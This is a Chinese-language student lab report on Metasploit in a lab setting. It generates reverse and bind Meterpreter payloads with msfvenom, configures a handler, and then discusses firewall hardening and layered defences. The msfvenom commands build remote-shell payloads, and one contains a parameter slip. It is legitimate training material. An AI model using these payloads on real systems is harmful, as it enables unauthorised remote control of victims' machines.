# 网络安全实验Day2: Metasploit渗透测试与系统加固

## 1. 实验目的
- 掌握Metasploit payload生成与handler配置
- 理解正向连接与反向连接的区别与应用场景
- 学习基础的系统安全加固方法
- 思考实际渗透测试中的攻击与防御策略

## 2. 环境准备
- Kali Linux作为攻击机
- vulnstack-win7作为目标机
- 
## 3. 实验步骤详解
### 3.1 Payload生成
使用msfvenom生成反向TCP Shell payload...
命令示例: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.23.128 LPORT=888 -f exe -o payload.exe`
[!](./images/p1.png)
[!](./images/p2.png)
[!](./images/p3.png)
### 3.2 Handler配置
在Metasploit中配置multi/handler模块...
命令序列: `use exploit/multi/handler` -> `set payload ...`
利用msfconsole 搜索端口
[!](./images/p4.png)
[!](./images/p5.png)
[!](./images/p6.png)
[!](./images/p7.png)
[!](./images/p8.png)
set
[!](./images/p9.png)
## 3.3 对目标主机进行安全加固
- 建立新的入站规则和出站规则
[！](./images/p10.png)
[！](./images/p11.png)
[！](./images/p12.png)
[！](./images/p13.png)
生成正向shell
## 3.1 实验步骤详解
### 3.1 Payload生成
使用msfvenom生成正向TCP Shell payload...
命令示例: `msfvenom -p windows/x64/meterpreter/bind_tcp HOST=192.168.101.12 LPORT=888 -f exe -o payload.exe`
[!](./images/n1.png)
[!](./images/p2.png)
[!](./images/p3.png)
### 3.2 Handler配置
在Metasploit中配置multi/handler模块...
命令序列: `use exploit/multi/handler` -> `set payload ...`
利用msfconsole 搜索端口
[!](./images/p4.png)
[!](./images/p5.png)
[!](./images/p6.png)
[!](./images/p7.png)
set 192.168.101.12
set 4444
[!](./images/p8.png)
[!](./images/p9.png)
## 3.3 对目标主机进行安全加固
- 建立新的入站规则和出站规则
[！](./images/p10.png)
[！](./images/p11.png)
[！](./images/p12.png)
[！](./images/p13.png)
## 4实验思考
## 1.在真实渗透测试中，什么场景下适合正向shell？
正向Shell适用场景：

    ▪ 攻击者可以直接访问目标主机所在的网络，并且目标主机开放了可以被攻击者利用的端口。例如，在一些小型的、没有复杂网络安全防护的局域网环境中，攻击者已经获得了局域网内的一个跳板机，并且目标主机开放了3389等远程连接端口，攻击者可以直接通过正向连接的方式获取目标主机的Shell。

    ▪ 当目标主机配置了允许外部连接的特定服务（如Web服务存在漏洞可被利用来获取Shell），并且攻击者能够直接与该服务建立连接时，适合使用正向Shell。
## 什么情况下适合反向shell？
反向Shell适用场景：

    ▪ 目标主机处于内网，且无法直接从外部访问（即存在NAT或防火墙限制了外部对内部的连接）。此时，目标主机主动连接到攻击者控制的公网服务器，建立起反向连接，使得攻击者能够获取目标主机的Shell权限。例如，企业内部员工电脑处于内网环境，攻击者通过钓鱼等方式让员工电脑运行包含反向Shell代码的程序，从而突破内网限制连接到攻击者的服务器。

    ▪ 当攻击者希望隐藏自己的真实IP地址时，也可以使用反向Shell。因为连接是从目标主机发起的，从网络流量角度看，是目标主机主动与攻击者的服务器通信，可能会误导安全人员对攻击源的判断。

## 2.仅通过配置出站规则能否有效预防所有反向链接 为什么？
  不能有效防御所有反向连接。
  原因如下：
    ▪ 加密连接：如果反向连接使用了加密协议（如HTTPS、SSH隧道等），防火墙仅检查网络层和传输层的出站规则，无法解析加密的应用层数据内容，也就无法识别这些连接是否为恶意的反向Shell连接。例如，攻击者可以通过将反向Shell封装在HTTPS流量中，绕过基于端口和简单协议特征检查的出站规则。

    ▪ 端口复用：攻击者可能利用合法服务常用的端口进行反向连接，由于出站规则通常是基于端口号和协议来配置的，当反向连接使用了与合法服务相同的端口时，防火墙可能会将其误认为是正常的出站流量而放行。比如，攻击者将反向Shell连接伪装成HTTP流量，使用80端口进行连接，如果出站规则只简单地禁止了一些非HTTP常用端口的出站连接，就无法阻止这种恶意连接。

    ▪ 应用层协议漏洞：某些应用层协议存在漏洞，攻击者可以利用这些漏洞绕过出站规则。例如，在一些自定义的应用程序中，如果其网络通信部分存在逻辑漏洞，攻击者可能通过构造特殊的请求，以应用程序正常通信的名义建立反向连接，而出站规则无法对这些应用层协议的细节进行全面检查。
## 3.除了基于端口的防火墙规则，还有哪些更高级的加固手段可以预防此类攻击？
入侵检测/防御系统（IDS/IPS）：部署IDS/IPS设备，它们可以对网络流量进行深度包检测（DPI），识别出异常的流量模式和攻击特征。例如，当检测到有大量来自内网的异常连接尝试访问外部的特定IP地址（可能是攻击者的服务器），或者检测到符合已知攻击模式的反向Shell流量时，IDS可以发出警报，IPS则可以直接阻断这些流量。

  ◦ 应用程序白名单：只允许运行经过授权的应用程序，禁止运行未知来源的可执行文件。这样可以防止攻击者通过植入恶意程序来建立反向Shell连接。例如，在企业环境中，通过组策略等方式配置应用程序白名单，只有像Microsoft Office、Adobe Reader等经过批准的软件才能在员工的电脑上运行。

  ◦ 网络分段：将网络划分为多个不同的子网，每个子网具有不同的访问权限和安全级别。通过限制不同子网之间的访问，即使某个子网中的一台主机被攻陷，攻击者也难以轻易地从该子网扩展到其他子网。例如，将企业的办公网络划分为研发子网、财务子网、市场子网等，限制它们之间的不必要访问，从而减少攻击面。

  ◦ 双因素认证（2FA）：对于重要的系统和应用程序，启用双因素认证。即使攻击者获取了用户的用户名和密码，没有第二重认证因素（如手机验证码、硬件令牌等），也无法登录系统，从而降低了攻击者通过窃取凭证建立反向Shell的可能性。

  ◦ 安全意识培训：对员工进行网络安全意识培训，教育他们识别钓鱼邮件、恶意链接和附件等常见的攻击手段。因为很多反向Shell攻击都是通过社会工程学手段，诱使用户运行恶意程序来实现的。例如，培训员工不要随意点击来自不明来源的邮件链接或下载附件，提高他们对网络安全风险的认识和防范能力。
## 6. 实验收获
- 学习到了实用的渗透测试技巧
- 理解了防火墙策略的重要性
- 认识到安全加固的多层次性
